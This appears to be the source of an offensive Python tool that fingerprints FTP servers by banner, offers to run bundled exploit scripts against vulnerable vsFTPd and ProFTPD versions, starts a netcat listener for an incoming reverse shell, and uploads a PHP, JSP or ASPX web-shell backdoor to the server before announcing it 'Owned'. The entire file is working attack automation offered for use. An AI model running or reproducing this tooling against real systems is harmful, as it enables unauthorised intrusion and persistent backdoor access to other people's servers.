
import os
import subprocess
from colorama import Fore # for fancy colors, nothing else
import requests

vuln_list = ['vsFTPd 2.3.4','ProFTPD 1.3.3c','ProFTPD 1.3.5','ProFTPD 1.3.2rc3']
vsFTP_backdoor = "Exploits/Linux/49757.py"
proFTP_135 = "Exploits/Linux/proftpd_1.3.5.py"
proFTP_133c = "Exploits/Linux/proftpd-1.3.3c.py"
ProFTPD_132rc3 = 'Exploits/Linux/ProFTPD_1.3.2rc3.py'

def vuln(ip,lib,t):
    for x in vuln_list:
        if x.strip('\n') in lib.getwelcome():
            print("    [" + Fore.RED + "Vulnerable" + Fore.RESET + "] " + x.strip('\n'))
            exploit = input("    [" + Fore.CYAN + "Question" + Fore.RESET + "] Run Exploit " + Fore.YELLOW + "Y/N " + Fore.RESET)
            if exploit.upper() == "Y":
                if "vsFTPd 2.3.4" in lib.getwelcome():
                    vsFTP_exploit(ip)
                elif "ProFTPD 1.3.5" in lib.getwelcome():
                    proFTP_V135(ip)
                elif "ProFTPD 1.3.3c" in lib.getwelcome():
                    local = input('   [?] Enter Private IP? ')
                    proFTP_V133c(local,ip)
                elif "ProFTPD 1.3.2rc3" in lib.getwelcome():
                    proFTP_132rc3(ip)
                
def vuln_backdoor(ip,lib,t):
    for x in vuln_list:
        if x.strip('\n') in lib.getwelcome():
            print("    [" + Fore.RED + "Vulnerable" + Fore.RESET + "] " + x.strip('\n'))
            exploit = input("    [" + Fore.CYAN + "Question" + Fore.RESET + "] Run Exploit " + Fore.YELLOW + "Y/N " + Fore.RESET)
            if exploit.upper() == "Y":
                if "vsFTPd 2.3.4" in lib.getwelcome():
                    vsFTP_exploit(ip)
                elif "ProFTPD 1.3.5" in lib.getwelcome():
                    proFTP_V135(ip)
                elif "ProFTPD 1.3.3c" in lib.getwelcome():
                    local = input('    [?] Enter Private IP? ')
                    proFTP_V133c(local,ip)
                elif "ProFTPD 1.3.2rc3" in lib.getwelcome():
                    proFTP_132rc3(ip)
                

def vsFTP_exploit(ip):
    print("    [" + Fore.CYAN + "Exploiting" + Fore.RESET + "] vsFTP Backdoor" + Fore.RESET)
    os.system('python3 ' + vsFTP_backdoor + ' ' + ip.strip('\n'))
        
def proFTP_V135(ip):
    print("    [" + Fore.RED + "Exploiting ProFTP" + Fore.RESET + "] Uploading Backdoor")
    os.system('python3 ' + proFTP_135 + " " + ip.strip('\n'))
    print("    [" + Fore.CYAN + "Starting" + Fore.RESET + "] Netcat")
    os.system('sudo nc -lvp 443')    
def proFTP_V133c(lhost,rhost):
    print("    [" + Fore.RED + "Exploiting ProFTP" + Fore.RESET + "] Backdoor")
    os.system('python3 ' + proFTP_133c + ' ' + lhost + ' ' + rhost )
        
def proFTP_132rc3(ip):
    print("    [" + Fore.RED + "Exploiting ProFTP" + Fore.RESET + "] Through Telnet")
    os.system('python3 ' + ProFTPD_132rc3 + ' ' + ip)
        
def ReverseShell(lib,ip):
    print("    [" + Fore.CYAN + "Uploading Backdoor" + Fore.RESET + "] ")
    try:
        r = requests.get("http://" + ip)
        web_server = r.headers['Server']
    except:
        pass
    
    if 'Apache' in web_server or 'nginx' in web_server:
        payload = 'xtrfhrjuyt56.php'
    if 'Coyote' in web_server or 'Tomcat' in web_server:
        payload = 'xtrfhrjuyt56.jsp'          
    if 'Microsoft' in web_server:
        payload = 'xtrfhrjuyt56.aspx'
    
    with open(payload, 'rb') as file:
        lib.storbinary(f"STOR {payload}",file)
        print("[" + Fore.RED + "Backdoor" + Fore.RESET + "] Successfully Uploaded")
        lib.retrlines("LIST")
        print("[" + Fore.RED + "Owned" + Fore.RESET + "] FTP Server" + Fore.RESET)
